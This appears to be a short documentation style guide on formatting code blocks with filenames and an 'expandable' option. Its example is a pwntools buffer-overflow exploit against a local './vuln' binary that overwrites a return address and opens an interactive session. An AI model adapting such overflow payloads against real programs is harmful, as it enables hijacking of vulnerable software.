## Code blocks

Always give code blocks a filename or title. Add `expandable` for long payloads.

```python exploit.py
from pwn import *
p = process('./vuln')
p.sendline(b'A'*44 + p32(0x80491e2))
p.interactive()
```

````mdx Source
```python exploit.py
...
```

```python exploit.py expandable
...
```
````
